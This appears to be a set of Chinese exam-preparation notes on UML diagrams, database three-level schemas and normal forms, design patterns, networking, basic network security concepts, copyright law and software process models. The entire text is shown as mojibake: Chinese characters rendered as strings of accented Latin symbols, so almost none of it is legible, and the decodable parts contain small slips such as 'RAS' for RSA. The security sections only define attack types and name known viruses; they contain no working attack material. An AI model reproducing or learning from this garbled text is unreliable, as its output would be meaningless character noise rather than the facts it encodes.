çŠ¶æ€å›¾æ˜¯æè¿°çŠ¶æ€åˆ°çŠ¶æ€æ§åˆ¶æµçš„å›¾ï¼Œå¸¸ç”¨è¯­åŠ¨æ€ç‰¹æ€§å»ºæ¨¡ã€‚å®ƒå±•ç¤ºäº†å¯¹è±¡åœ¨å…¶å£°æ˜å‘¨æœŸä¸­çš„ä¸åŒçŠ¶æ€ä»¥åŠçŠ¶æ€ä¹‹é—´çš„è½¬æ¢ã€‚ é¡ºåºå›¾Sequence Diagram æè¿°å¤šä¸ªå¯¹è±¡ä¹‹é—´æŒ‰é¡ºåºè°ƒç”¨æƒ…å†µ åä½œå›¾Collaboration Diagramï¼ˆé€šä¿¡å›¾ï¼‰ æè¿°äº†å¯¹è±¡ä¹‹é—´çš„ååŠ©å…³ç³»ï¼Œå±•ç¤ºäº†å¯¹è±¡ä¹‹é—´çš„æ¶ˆæ¯ä¼ é€’å’Œäº¤äº’ æ„ä»¶å›¾Component Diagram ä¸€ç§ç‰¹æ®Šçš„UMLå›¾ï¼Œç”¨äºæè¿°ç³»ç»Ÿçš„é™æ€å®ç°è§†å›¾ï¼Œå±•ç¤ºç³»ç»Ÿä¸­çš„è½¯ä»¶å’Œç¡¬ä»¶ç»„ä»¶ä»¥åŠä»–ä»¬ä¹‹é—´çš„ä¾èµ–å…³ç³» éƒ¨ç½²å›¾Deployment Diagram éƒ¨ç½²å›¾å®šä¹‰ç³»ç»Ÿä¸­è½¯ç¡¬ä»¶çš„ç‰©ç†ä½“ç³»ç»“æ„ï¼Œå±•ç¤ºäº†ç¡¬ä»¶èŠ‚ç‚¹ã€è½¯ä»¶ç»„ä»¶ä»¥åŠå®ƒä»¬ä¹‹é—´çš„éƒ¨ç½²å…³ç³»ã€‚ ç”¨ä¾‹å›¾ä¹‹é—´çš„å…³ç³» æ³›åŒ–å…³ç³» è¿™æ˜¯ä¸€ç§ç»§æ‰¿å…³ç³»ï¼Œå­ç”¨ä¾‹æ˜¯çˆ¶ç”¨ä¾‹çš„ä¸€ç§ç‰¹æ®Šå½¢å¼ï¼Œå®ƒç»§æ‰¿äº†çˆ¶ç”¨ä¾‹çš„æ‰€æœ‰ç»“æ„ã€è¡Œä¸ºã€å…³ç³»ã€‚åœ¨å›¾å½¢è¡¨ç¤ºä¸­ï¼Œä¸‰è§’ç®­å¤´æŒ‡å‘çˆ¶ç”¨ä¾‹ã€‚å¦‚ä¸Šæ‰€ç¤ºEmailæˆ–æ˜µç§°ç™»å½•ã€æ‰‹æœºå·ç™»å½• åŒ…å«å…³ç³» ä¸€ä¸ªç”¨ä¾‹çš„è¡Œä¸ºåŒ…å«äº†å¦ä¸€ä¸ªç”¨ä¾‹çš„è¡Œä¸ºã€‚å½“æ‰§è¡ŒåŸºç”¨ä¾‹æ˜¯ï¼Œæ¯æ¬¡éƒ½å¿…é¡»è°ƒç”¨è¢«åŒ…å«ç”¨ä¾‹ã€‚è¢«åŒ…å«ç”¨ä¾‹ä¹Ÿå¯ä»¥å•ç‹¬æ‰§è¡Œã€‚ æ‰©å±•å…³ç³» æ‰©å±•ç”¨ä¾‹åœ¨æ‰©å±•ç‚¹ä¸Šå¢åŠ æ–°çš„ç»´æŠ¤å’Œå«ä¹‰ã€‚æ‰©å±•ç”¨ä¾‹ä¸ºåŸºç”¨ä¾‹æ·»åŠ æ–°çš„è¡Œä¸ºï¼Œç®­å¤´æŒ‡å‘åŸºç”¨ä¾‹ã€‚è¿™ç§å…³ç³»å…è®¸åŸºç”¨ä¾‹çš„è¡Œä¸ºåœ¨ç‰¹å®šæ¡ä»¶ä¸‹è¢«æ‰©å±•ç”¨ä¾‹æ‰€æ·»åŠ çš„è¡Œä¸ºæ‰€ä¿®æ”¹æˆ–å¢å¼ºã€‚ æ•°æ®åº“ æ•°æ®åº“çš„å¯¹åº”å…³ç³» | è¡¨ç° | ä¸‰çº§æ¨¡å¼ | è§†å›¾ | | -------- | -------------------- | ------------------- | | åŸºæœ¬è¡¨ | æ¨¡å¼ | æ¦‚å¿µè§†å›¾ | | å­˜å‚¨æ–‡ä»¶ | å†…æ¨¡å¼ï¼ˆåªæœ‰ä¸€ä¸ªï¼‰ | å†…éƒ¨è§†å›¾ | | è§†å›¾ | å¤–æ¨¡å¼ï¼ˆå¯ä»¥æœ‰å¤šä¸ªï¼‰ | ç”¨æˆ·è§†å›¾ | ä¸¤çº§æ˜ åƒ æ¨¡å¼/å†…æ¨¡å¼æ˜ åƒ ç‰©ç†ç‹¬ç«‹æ€§ å¤–æ¨¡å¼/æ¨¡å¼æ˜ åƒ é€»è¾‘ç‹¬ç«‹æ€§ æ•°æ®åº“çš„ä¸‰çº§æ¨¡å¼ æ¨¡å¼ æè¿° æ¦‚å¿µæ¨¡å¼ æ¦‚å¿µæ¨¡å¼æ˜¯æ•°æ®åº“ä¸­å…¨ä½“æ•°æ®çš„é€»è¾‘ç»“æ„å’Œç‰¹å¾çš„æè¿°ï¼Œæ˜¯æ‰€æœ‰ç”¨æˆ·çš„å…¬å…±æ•°æ®è§†å›¾ã€‚ä¸€ä¸ªæ•°æ®åº“åªæœ‰ä¸€ä¸ªæ¦‚å¿µæ¨¡å¼ã€‚ å¤–æ¨¡å¼ å¤–æ¨¡å¼ï¼ˆå­æ¨¡å¼ã€ç”¨æˆ·æ¨¡å¼ï¼‰ç”¨ä»¥æè¿°ç”¨æˆ·çœ‹åˆ°æˆ–ä½¿ç”¨çš„å“ªéƒ¨åˆ†æ•°æ®çš„é€»è¾‘ç»“æ„ï¼Œç”¨æˆ·æ ¹æ®å¤–æ¨¡å¼ç”¨æ•°æ®æ“ä½œè¯­å¥æˆ–åº”ç”¨ç¨‹åºå»æ“ä½œæ•°æ®åº“ä¸­çš„æ•°æ® å†…æ¨¡å¼ å†…æ¨¡å¼å®šä¹‰çš„æ˜¯å­˜å‚¨è®°å½•çš„ç±»å‹ã€å­˜å‚¨åŸŸçš„è¡¨ç¤ºä»¥åŠå­˜å‚¨è®°å½•çš„ç‰©ç†é¡ºåºï¼ŒæŒ‡å¼•å…ƒã€ç´¢å¼•å’Œå­˜å‚¨è·¯å¾„ç­‰æ•°æ®çš„å­˜å‚¨ç»„ç»‡ã€‚ä¸€ä¸ªæ•°æ®åº“åªæœ‰ä¸€ä¸ªå†…æ¨¡å¼ 4ç±»æ•…éšœ äº‹åŠ¡å†…éƒ¨æ•…éšœã€‚äº‹åŠ¡å†…éƒ¨çš„æ•…éšœæœ‰çš„å¯ä»¥é€šè¿‡äº‹åŠ¡ç¨‹åºæœ¬èº«å‘ç°ã€‚ä½†æœ‰äº›æ˜¯éé¢„æœŸçš„ï¼Œä¸èƒ½ç”±äº‹åŠ¡ç¨‹åºå¤„ç†ï¼Œä¾‹å¦‚è¿ç®—æº¢å‡ºã€å¹¶å‘äº‹åŠ¡å‘ç”Ÿæ­»é”ç­‰ ç³»ç»Ÿæ•…éšœã€‚é€šå¸¸ç§°ä¸ºè½¯æ•…éšœï¼Œæ˜¯æŒ‡é€ æˆç³»ç»Ÿåœæ­¢è¿è¡Œçš„ä»»ä½•äº‹ä»¶ï¼Œä½¿å¾—ç³»ç»Ÿè¦é‡æ–°å¯åŠ¨ã€‚ ä»‹è´¨ç ´åã€‚é€šå¸¸ç§°ä¸ºç¡¬æ•…éšœï¼Œå¦‚ç£ç›˜æŸåã€ç£å¤´ç¢°æ’å’Œç¬æ—¶å¼ºç£å¹²æ‰°ã€‚æ­¤ç±»æ•…éšœå‘ç”Ÿçš„å‡ ç‡å°ï¼Œä½†ç ´åæ€§æœ€å¤§ã€‚ è®¡ç®—æœºç—…æ¯’ã€‚ ä¸‰å¤§èŒƒå¼ 1NFã€‚æ•°æ®åº“è¡¨çš„æ¯ä¸€åˆ—éƒ½æ˜¯ä¸å¯åˆ†å‰²çš„åŸå­é¡¹ã€‚é¿å…æ•°æ®å†—ä½™å’Œæ··æ·†ã€‚ ä¾‹å¦‚ï¼šä¸èƒ½åœ¨â€œå§“åâ€åˆ—ä¸­åŒæ—¶å­˜å‚¨ä¸€ä¸ªäººçš„å§“æ¢å’Œåï¼Œè€Œåº”è¯¥æ‹†åˆ†ä¸ºâ€å§“â€œå’Œâ€åâ€ã€‚ 2NFã€‚é™¤äº†ä¸»é”®ä»¥å¤–ï¼Œå…¶ä»–å­—æ®µéƒ½å¿…é¡»ä¾èµ–äºä¸»é”®ã€‚ ä¾‹å¦‚ï¼šåœ¨ä¸€ä¸ªè®¢å•è¡¨ä¸­ï¼Œè®¢å•å·ï¼ˆä¸»é”®ï¼‰ä¸è®¢å•è¯¦æƒ…ã€å®¢æˆ·ä¿¡æ¯ç­‰å­—æ®µéƒ½æœ‰å…³è”ã€‚ä½†å®¢æˆ·ä¿¡æ¯ä¸åº”è¯¥ç›´æ¥å­˜å‚¨åœ¨è®¢å•è¡¨ä¸­ï¼Œè€Œåº”è¯¥å•ç‹¬å»ºç«‹ä¸€ä¸ªå®¢æˆ·è¡¨ï¼Œå¹¶é€šè¿‡è®¢å•å·ä¸å®¢æˆ·IDè¿›è¡Œå…³è”ã€‚ 3NFã€‚åœ¨æ»¡è¶³ç¬¬äºŒèŒƒå¼çš„åŸºç¡€ä¸Šã€‚3NF è¦æ±‚é£é€æ¸å­—æ®µä¹‹é—´ä¸å­˜åœ¨ä¼ é€’ä¾èµ–å…³ç³»ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œä¸€ä¸ªéä¸»é”®å­—æ®µä¸èƒ½ä¾èµ–äºå¦ä¸€ä¸ªéä¸»é”®å­—æ®µã€‚ ä¾‹å¦‚ï¼šåœ¨ä¸€ä¸ªå‘˜å·¥è¡¨ä¸­ï¼Œå‘˜å·¥å·ï¼ˆä¸»é”®ï¼‰ä¸å§“åã€éƒ¨é—¨å·ç­‰å­—æ®µéƒ½æœ‰å…³è”ã€‚ä½†éƒ¨é—¨å·ï¼ˆéä¸»é”®ï¼‰ä¸åº”è¯¥ä¸éƒ¨é—¨åç§°ï¼ˆéä¸»é”®ï¼‰ç›´æ¥å…³è”ï¼Œè€Œåº”è¯¥é€šè¿‡éƒ¨é—¨å·ä¸éƒ¨é—¨è¡¨è¿›è¡Œå…³è”ã€‚ è¿æ¥ è®¾è®¡æ¨¡å¼ åˆ›å»ºå‹ å·¥å‚æ–¹æ³•Factory Method å®šä¹‰ä¸€ä¸ªç”¨äºåˆ›å»ºå¯¹è±¡çš„æ¥å£ï¼Œè®©å­ç±»å†³å®šå®ä¾‹åŒ–å“ªä¸€ä¸ªç±» æŠ½è±¡å·¥å‚Acstract Factory æä¾›ä¸€ä¸ªåˆ›å»ºä¸€ç³»åˆ—ç›¸å…³æˆ–ç›¸äº’ä¾èµ–å¯¹è±¡çš„æ¥å£ï¼Œè€Œæ— é¡»æŒ‡å®šä»–ä»¬å…·ä½“çš„ç±» ç”Ÿæˆå™¨Builder å°†ä¸€ä¸ªå¤æ‚å¯¹è±¡çš„æ„å»ºä¸å®ƒçš„è¡¨ç¤ºåˆ†ç¦»ï¼Œä½¿å¾—åŒæ ·çš„æ„å»ºè¿‡ç¨‹å¯ä»¥åˆ›å»ºä¸åŒçš„è¡¨ç¤º åŸå‹Prototype ç”¨åŸå‹å®ä¾‹æŒ‡å®šåˆ›å»ºå¯¹è±¡çš„ç§ç±»ï¼Œå¹¶ä¸”é€šè¿‡å¤åˆ¶è¿™äº›åŸå‹åˆ›å»ºæ–°çš„å¯¹è±¡ å•ä¾‹Singleton ä¿è¯ä¸€ä¸ªç±»ä»…æœ‰ä¸€ä¸ªå®ä¾‹ï¼Œå¹¶æä¾›ä¸€ä¸ªè®¿é—®å®ƒçš„å…¨å±€è®¿é—®ç‚¹ ç»“æ„å‹ ç»“æ„å‹ç±»æ¨¡å¼åªæœ‰ä¸€ä¸ªé€‚é…å™¨ é€‚é…å™¨Adapter å°†ä¸€ä¸ªç±»çš„æ¥å£è½¬æ¢æˆå®¢æˆ·å¸Œæœ›çš„å¦ä¸€ä¸ªæ¥å£ æ¡¥æ¥Bridge å°†æŠ½è±¡éƒ¨åˆ†ä¸å…¶å®ç°éƒ¨åˆ†åˆ†ç¦»ï¼Œä½¿å®ƒä»¬éƒ½å¯ä»¥ç‹¬ç«‹çš„å˜åŒ– ç»„åˆComposite å°†å¯¹è±¡ç»„åˆæˆæ ‘å½¢ç»“æ„ä»¥è¡¨ç¤ºâ€œéƒ¨åˆ†-æ•´ä½“â€çš„å±‚æ¬¡ç»“æ„ è£…é¥°Decorator åŠ¨æ€åœ°ç»™ä¸€ä¸ªå¯¹è±¡æ·»åŠ ä¸€äº›é¢å¤–çš„èŒè´£ å¤–è§‚Facade ä¸ºå­ç³»ç»Ÿä¸­çš„ä¸€ç»„ç»“æ„æä¾›ä¸€ä¸ªä¸€è‡´çš„ç•Œé¢ï¼ŒFacadeæ¨¡å¼å®šä¹‰äº†ä¸€ä¸ªé«˜å±‚æ¥å£ï¼Œè¿™ä¸ªæ¥å£ä½¿å¾—è¿™ä¸€å­ç³»ç»Ÿæ›´åŠ å®¹æ˜“ä½¿ç”¨ äº«å…ƒFlyWeight è¿ç”¨å…±äº«æŠ€æœ¯æœ‰æ•ˆåœ°æ”¯æŒå¤§é‡ç»†ç²’åº¦çš„å¯¹è±¡ ä»£ç†Proxy ä¸ºå…¶ä»–å¯¹è±¡æä¾›ä¸€ç§ä»£ç†ä»¥æ§åˆ¶å¯¹è¿™ä¸ªå¯¹è±¡çš„è®¿é—® è¡Œä¸ºå‹ è¡Œä¸ºå‹ç±»æ¨¡å¼åŒ…æ‹¬ è§£é‡Šå™¨å’Œæ¨¡ç‰ˆæ–¹æ³•ï¼Œå…¶ä»–çš„éƒ½ä¸ºè¡Œä¸ºå‹å¯¹è±¡æ¨¡å¼ è´£ä»»é“¾Chain of Responsibility åå¤šä¸ªå¯¹è±¡éƒ½æœ‰æœºä¼šå¤„ç†è¯·æ±‚ï¼Œä»è€Œé¿å…è¯·æ±‚çš„å‘é€è€…å’Œæ¥æ”¶è€…ä¹‹é—´çš„è€¦åˆå…³ç³» å‘½ä»¤Command è®²ä¸€ä¸ªè¯·æ±‚å°è£…ä¸ºä¸€ä¸ªå¯¹è±¡ï¼Œä»è€Œä½¿å¾—å¯ä»¥ç”¨ä¸åŒçš„è¯·æ±‚å¯¹å®¢æˆ·è¿›è¡Œå‚æ•°åŒ–ï¼›å¯¹è¯·æ±‚æ’é˜Ÿæˆ–è®°å½•è¯·æ±‚æ—¥å¿—ï¼Œä»¥åŠæ”¯æŒå¯æ’¤é”€çš„æ“ä½œ è§£é‡Šå™¨Interpreter ç»™å®šä¸€ä¸ªè¯­è¨€ï¼Œå®šä¹‰å®ƒçš„æ–‡æ³•çš„ä¸€ç§è¡¨ç¤ºï¼Œå¹¶å®šä¹‰ä¸€ä¸ªè§£é‡Šå™¨ï¼Œè¿™ä¸ªè§£é‡Šå™¨ä½¿ç”¨è¯¥è¡¨ç¤ºæ¥è§£é‡Šè¯­è¨€ä¸­çš„å¥å­ è¿­ä»£å™¨Iterator æä¾›ä¸€ç§æ–¹æ³•é¡ºåºè®¿é—®ä¸€ä¸ªèšåˆå¯¹è±¡ä¸­çš„å„ä¸ªå…ƒç´ ï¼Œä¸”ä¸éœ€è¦æš´éœ²è¯¥å¯¹è±¡çš„å†…éƒ¨è¡¨ç¤º ä¸­ä»‹è€…Mediator ç”¨ä¸€ä¸ªä¸­ä»‹å¯¹è±¡æ¥å°è£…ä¸€ç³»åˆ—çš„å¯¹è±¡äº¤äº’ å¤‡å¿˜å½•Memento åœ¨ä¸ç ´åå°è£…æ€§çš„å‰æä¸‹æ•è·ä¸€ä¸ªå¯¹è±¡çš„å†…éƒ¨çŠ¶æ€ï¼Œå¹¶åœ¨å¯¹è±¡ä¹‹å¤–ä¿å­˜è¿™ä¸ªçŠ¶æ€ è§‚å¯Ÿè€…Observer å®šä¹‰å¯¹è±¡é—´çš„ä¸€ç§ä¸€å¯¹å¤šçš„ä¾èµ–å…³ç³»ï¼Œå½“ä¸€ä¸ªå¯¹è±¡çš„çŠ¶æ€å‘ç”Ÿæ”¹å˜æ—¶ï¼Œæ‰€æœ‰ä¾èµ–äºå®ƒçš„å¯¹è±¡éƒ½å¾—åˆ°é€šçŸ¥å¹¶è¢«è‡ªåŠ¨æ›´æ–° çŠ¶æ€State å…è®¸ä¸€ä¸ªå¯¹è±¡åœ¨å…¶å†…éƒ¨çŠ¶æ€æ”¹å˜æ—¶æ”¹å˜ä»–çš„è¡Œä¸º ç­–ç•¥Strategy å®šä¹‰ä¸€ç³»åˆ—çš„ç®—æ³•ï¼ŒæŠŠä»–ä»¬ä¸€ä¸ªä¸ªå°è£…èµ·æ¥ï¼Œå¹¶ä¸”ä½¿å®ƒä»¬å¯ä»¥äº’ç›¸æ›¿æ¢ æ¨¡æ¿åå¤å™¶Template Method å®šä¹‰ä¸€ä¸ªæ“ä½œä¸­çš„ç®—æ³•éª¨æ¶ï¼Œè€Œå°†ä¸€äº›æ­¥éª¤å»¶è¿Ÿåˆ°å­ç±»ä¸­ è®¿é—®è€…Visitor è¡¨ç¤ºä¸€ä¸ªä½œç”¨äºæŸå¯¹è±¡ç»“æ„ä¸­çš„å„å…ƒç´ çš„æ“ä½œ ç½‘ç»œç›¸å…³ TCPå’ŒUDPåè®®å‡æä¾›äº†ç«¯å£å¯»å€åŠŸèƒ½ DNSåŸŸåæŸ¥è¯¢çš„æ¬¡åºæ˜¯ï¼šæœ¬åœ°çš„hostsæ–‡ä»¶-&gt;æœ¬åœ°DNSç¼“å­˜-&gt;æœ¬åœ°DNSæœåŠ¡å™¨-&gt;æ ¹åŸŸåæœåŠ¡å™¨ ç½‘ç»œå®‰å…¨ å¯¹ç§°å¯†é’¥ç®—æ³•ï¼ˆå…±äº«å¯†é’¥åŠ å¯†ç®—æ³•ï¼‰ éå¯¹ç§°å¯†é’¥ç®—æ³•ï¼ˆå…¬é’¥ã€å…¬å¼€å¯†é’¥åŠ å¯†ç®—æ³•ï¼‰ DES3DESRC-5RC4IDEAAESåˆ†ç»„åŠ å¯†ç®—æ³• RSAECCDSA AESæ˜¯ä¸€ç§åˆ†ç»„åŠ å¯†ç®—æ³• ARPæ”»å‡»é€ æˆç½‘ç»œæ— æ³•è·¨ç½‘æ®µé€šä¿¡çš„åŸå› æ˜¯ä¼ªé€ ç½‘å…³ARPæŠ¥æ–‡ä½¿å¾—æ•°æ®åŒ…æ— æ³•å‘é€åˆ°ç½‘å…³ã€‚ DESæ˜¯å…±äº«å¯†é’¥åŠ å¯†ç®—æ³• PKIä½“åˆ¶ä¸­ï¼Œä¿è¯æ•°å­—è¯ä¹¦ä¸è¢«ç¯¡æ”¹çš„æ–¹æ³•æ˜¯ç”¨CAçš„ç§é’¥å¯¹æ•°å­—è¯ä¹¦ç­¾åã€‚ PPPè®¤è¯ï¼šPPPæ‰©å±•è®¤è¯åè®®æ”¯æŒå¤šç§è®¤è¯æœºåˆ¶ å£ä»¤éªŒè¯åè®®ï¼ˆPAPï¼‰ï¼šç®€å•çš„ä¸¤æ¬¡æ¡æ‰‹è®¤è¯æ–¹æ³•ï¼Œé‡‡ç”¨æ–‡æœ¬æ–¹å¼å‘é€å¯†ç  è´¨è¯¢æ¡æ‰‹è®¤è¯åè®®ï¼ˆCHAPï¼‰ï¼šå®‰å…¨è®¤è¯åè®®æ˜¯CHAPï¼Œå®ƒä½¿ç”¨ä¸‰æ¬¡æ¡æ‰‹çš„ä¼šè¯è¿‡ç¨‹ä¼ é€å¯†æ–‡ã€‚å…±äº«å¯†é’¥å‚ä¸è®¡ç®—Hashå€¼ï¼Œå¯†é’¥ä¸é€šè¿‡ç½‘ç»œä¼ é€ã€‚ä¹Ÿå¯ä»¥è¿›è¡ŒåŒå‘èº«ä»½è®¤è¯ï¼Œç»ˆç«¯ä¹Ÿå¯ä»¥å‘æœåŠ¡å™¨è¿›è¡ŒæŒ‘æˆ˜ï¼Œä½¿å¾—åŒæ–¹éƒ½èƒ½ç¡®è®¤å¯¹æ–¹èº«ä»½çš„åˆæ³•æ€§ã€‚ X509æ•°å­—è®¤è¯è¯ä¹¦æ ‡å‡†æ¨èä½¿ç”¨çš„å¯†ç ç®—æ³•RASã€‚è€Œå›½å¯†SM2æ•°å­—è¯ä¹¦é‡‡ç”¨çš„å…¬é’¥å¯†ç ç®—æ³•æ˜¯ECCåŸºäºæ¤­åœ†æ›²çº¿çš„å…¬é’¥å¯†ç ç®—æ³•ã€‚ECCç®—æ³•ä¸RASç®—æ³•ç›¸æ¯”å…·æœ‰åŠ å¯†å¼ºåº¦é«˜ã€è®¡ç®—é€Ÿåº¦å¿«çš„ä¼˜ç‚¹ã€‚ ç”µå­é‚®ä»¶ç›¸å…³çš„åè®®ï¼š SSL HTTPS PGP ç½‘ç»œæ”»å‡»ï¼šä¸»åŠ¨æ”»å‡»å’Œè¢«åŠ¨æ”»å‡» ä¸»åŠ¨æ”»å‡»ï¼šæ”»å‡»è€…è®¿é—®ä»–æ‰€éœ€ä¿¡æ¯çš„æ•…æ„è¡Œä¸ºã€‚æ¯”å¦‚é€šè¿‡è¿œç¨‹ç™»å½•åˆ°ç‰¹å®šæœºå™¨çš„é‚®ä»¶ç«¯å£ä»¥æ‰¾å‡ºä¼ä¸šçš„é‚®ä»¶æœåŠ¡å™¨çš„ä¿¡æ¯ï¼›ä¼ªé€ æ— æ•ˆIPåœ°å€å»è¿æ¥æœåŠ¡å™¨ï¼Œä½¿æ¥å—åˆ°é”™è¯¯IPåœ°å€çš„ç³»ç»Ÿæµªè´¹æ—¶é—´å»è¿æ¥é‚£ä¸ªéæ³•åœ°å€ã€‚æ”»å‡»è€…æ˜¯åœ¨ä¸»åŠ¨åœ°åšä¸€äº›ä¸åˆ©äºä½ æˆ–ä½ çš„å…¬å¸ç³»ç»Ÿçš„äº‹æƒ…ã€‚ä¸»åŠ¨æ”»å‡»åŒ…æ‹¬æ‹’ç»æœåŠ¡æ”»å‡»ï¼ˆDosï¼‰ã€åˆ†å¸ƒå¼æ‹’ç»æœåŠ¡ï¼ˆDDoSï¼‰ã€ä¿¡æ¯ç¯¡æ”¹ã€èµ„æºä½¿ç”¨ã€æ¬ºéª—ã€ä¼ªè£…ã€é‡æ”¾ç­‰æ”»å‡»æ–¹æ³• è¢«åŠ¨æ”»å‡»ä¸»è¦æ˜¯æ”¶é›†ä¿¡æ¯è€Œä¸è¿›è¡Œè®¿é—®ï¼Œæ•°æ®çš„åˆæ³•ç”¨æˆ·å¯¹è¿™ç§æ´»åŠ¨ä¸€ç‚¹ä¹Ÿä¸ä¼šå¯Ÿè§‰åˆ°ã€‚è¢«åŠ¨æ”»å‡»åŒ…æ‹¬å—…æ¢ã€ä¿¡æ¯æ”¶é›†ã€ä¼šè¯æ‹¦æˆªç­‰æ”»å‡»æ–¹æ³•ã€‚ DoSæ”»å‡» SYN Floodingæ”»å‡»å±äºDoSæ”»å‡» åŒ…è¿‡æ»¤é˜²ç«å¢™ åŒ…è¿‡æ»¤æŠ€æœ¯å¯¹åº”ç”¨å’Œç”¨æˆ·æ˜¯é€æ˜çš„ å…¬é’¥ä½“ç³»ä¸­ï¼Œç§é’¥ç”¨äºè§£å¯†å’Œç­¾åï¼Œå…¬é’¥ç”¨äºåŠ å¯†å’ŒéªŒè¯ç­¾å ç”¨æˆ·Aå’ŒBè¦è¿›è¡Œå®‰å…¨é€šä¿¡ï¼Œé€šä¿¡è¿‡ç¨‹éœ€è¦åŒæ–¹èº«ä»½å’Œæ¶ˆæ¯ä¸å¯å¦è®¤ã€‚Aå’ŒBé€šä¿¡æ—¶å¯ä½¿ç”¨æ•°å­—è¯ä¹¦æ¥å¯¹ç”¨æˆ·çš„èº«ä»½è¿›è¡Œè®¤è¯ï¼›ä½¿ç”¨æ•°å­—ç­¾åç¡®ä¿æ¶ˆæ¯ä¸å¯å¦è®¤ã€‚ ç½‘ç»œå®‰å…¨åŒ…å«äº†ç½‘ç»œä¿¡æ¯çš„ï¼š å¯ç”¨æ€§ï¼šç”¨æˆ·å¯åˆ©ç”¨ç½‘ç»œæ—¶é—´çš„ç™¾åˆ†æ¯” ä¿å¯†æ€§ï¼š å®Œæ•´æ€§ï¼šæœªç»æˆæƒä¸èƒ½è¿›è¡Œä¿®æ”¹ çœŸå®æ€§ï¼šé€šè¿‡æ•°å­—ç­¾å è®¡ç®—æœºç—…æ¯’çš„ç‰¹å¾åŒ…æ‹¬ï¼š ä¼ æŸ“æ€§ã€è§¦å‘æ€§ éšè”½æ€§ã€æ„ŸæŸ“æ€§ æ½œä¼æ€§ã€ç ´åæ€§ è®¿é—®æ§åˆ¶çš„ä»»åŠ¡åŒ…æ‹¬æˆæƒã€ç¡®å®šå­˜å–æƒé™ã€å®æ–½å­˜å–æƒé™ å…¥ä¾µæ£€æµ‹ç³»ç»Ÿï¼š ä¸“å®¶ç³»ç»Ÿ æ¨¡å‹æ£€æµ‹ ç®€å•åŒ¹é… åº”ç”¨çº§é˜²ç«å¢™æ˜¯å†…éƒ¨ç½‘å’Œå¤–éƒ¨ç½‘çš„éš”ç¦»ç‚¹ï¼Œå®ƒå¯å¯¹åº”ç”¨å±‚çš„é€šä¿¡æ•°æ®è¿›è¡Œç›‘æ§å’Œè¿‡æ»¤ è •è™«ç—…æ¯’ï¼šçº¢è‰²ä»£ç ã€çˆ±è™«ç—…æ¯’ã€ç†ŠçŒ«çƒ§é¦™ã€Nimdaç—…æ¯’ã€çˆ±ä¸½æ»‹ç—…æ¯’ã€éœ‡ç½‘ æœ¨é©¬è½¯ä»¶ï¼šå†°æ²³ ä¸‰ç½‘åˆä¸€çš„ä¸‰ç½‘æ˜¯æŒ‡ç”µä¿¡ç½‘ã€å¹¿æ’­ç”µè§†ç½‘ã€äº’è”ç½‘ çŸ¥è¯†äº§æƒåŸºç¡€çŸ¥è¯† å•†æ ‡æƒçš„ä¿æŠ¤å™¨æ˜¯å¯ä»¥å»¶é•¿çš„ åˆç†ä½¿ç”¨æŒ‡å¯ä»¥ä¸ç»è‘—ä½œæƒäººè®¸å¯ï¼Œä¸éœ€æ”¯ä»˜æŠ¥é…¬ï¼Œä½¿ç”¨å…¶ä½œå“ è½¯ä»¶è‘—ä½œæƒä¸­ç¿»è¯‘æƒï¼š å°†åŸè½¯ä»¶ä»ä¸€ç§ç¨‹åºè®¾è®¡è¯­è¨€è½¬æ¢æˆå¦ä¸€ç§ç¨‹åºè®¾è®¡è¯­è¨€ è½¯ä»¶è‘—ä½œæƒäººå¯¹å…¶è½¯ä»¶äº«æœ‰çš„ä»¥å…¶å®ƒå„ç§è¯­è¨€æ–‡å­—å½¢å¼å†è¡¨ç° å¯¹è½¯ä»¶çš„æ“ä½œç•Œé¢æˆ–è€…ç¨‹åºä¸­æ¶‰åŠçš„è¯­è¨€æ–‡å­—ç¿»è¯‘æˆå¦ä¸€ç§è¯­è¨€æ–‡å­— å¼•ç”¨èµ„æ–™å¿…é¡»æ˜¯å·²å‘è¡¨çš„ä½œå“ï¼Œä½†åªèƒ½é™äºä»‹ç»ã€è¯„è®ºä½œå“ï¼Œåªè¦ä¸æ„æˆè‡ªå·±ä½œå“çš„ä¸»è¦éƒ¨åˆ†ï¼Œå¯é€‚å½“å¼•ç”¨èµ„æ–™ï¼Œè€Œä¸å¿…å¾å¾—åŸä½œè€…çš„åŒæ„ï¼Œä¸éœ€è¦å‘ä»–æ”¯ä»˜æŠ¥é…¬ã€‚ æ”¿ç­–æ³•è§„ä¸ä½¿ç”¨è‘—ä½œæƒæ³•ä¿æŠ¤ ç½²åæƒã€ä¿®æ”¹æƒã€ä½œå“å®Œæ•´æƒå—æ°¸ä¹…ä¿æŠ¤ å¿…é¡»ä½¿ç”¨æ³¨å†Œå•†æ ‡çš„æ˜¯çƒŸè‰åˆ¶å“ å¤šåª’ä½“ç›¸å…³ æ•°å­—è¯­éŸ³çš„é‡‡æ ·é¢‘ç‡å®šä¹‰ä¸º8KHzï¼Œæ˜¯å› ä¸º è¯­éŸ³ä¿¡å·å®šä¹‰çš„é¢‘ç‡æœ€é«˜å€¼ä¸º4kHzã€‚ ç”±ISOåˆ¶å®šçš„MPEGç³»åˆ—æ ‡å‡†ä¸­ï¼ŒMPEG-7æ˜¯å¤šåª’ä½“å†…å®¹æè¿°æ¥å£æ ‡å‡† è½¯ä»¶å·¥ç¨‹åŸºç¡€çŸ¥è¯† ç€‘å¸ƒæ¨¡å‹ï¼šå°†è½¯ä»¶ç”Ÿå­˜å‘¨æœŸä¸­çš„å„ä¸ªæ´»åŠ¨è§„å®šä¸ºä¾çº¿æ€§é¡ºåºè¿æ¥çš„è‹¥å¹²é˜¶æ®µã€‚ä»¥æ–‡æ¡£ä½œä¸ºé©±åŠ¨ã€é€‚åˆäºè½¯ä»¶éœ€æ±‚å¾ˆæ˜ç¡®çš„è½¯ä»¶é¡¹ç›®ã€‚ä¼˜ç‚¹æ˜¯å®¹æ˜“ç†è§£ï¼Œç®¡ç†æˆæœ¬ä½ï¼›å¼ºè°ƒå¼€å‘çš„é˜¶æ®µæ€§æ—©æœŸè®¡åˆ’åŠéœ€è¦è°ƒæŸ¥å’Œäº§å“æµ‹è¯• Væ¨¡å‹ï¼šæè¿°äº†è´¨é‡ä¿è¯æ´»åŠ¨å’Œæ²Ÿé€šã€å»ºæ¨¡ç›¸å…³æ´»åŠ¨ä»¥åŠæ—©æœŸæ„å»ºç›¸å…³çš„æ´»åŠ¨ä¹‹é—´çš„å…³ç³»ã€‚æä¾›äº†ä¸€ç§å°†éªŒè¯ç¡®è®¤æ´»åŠ¨åº”ç”¨äºæ—©èµ·è½¯ä»¶å·¥ç¨‹å·¥ä½œä¸­çš„æ–¹æ³•ã€‚ 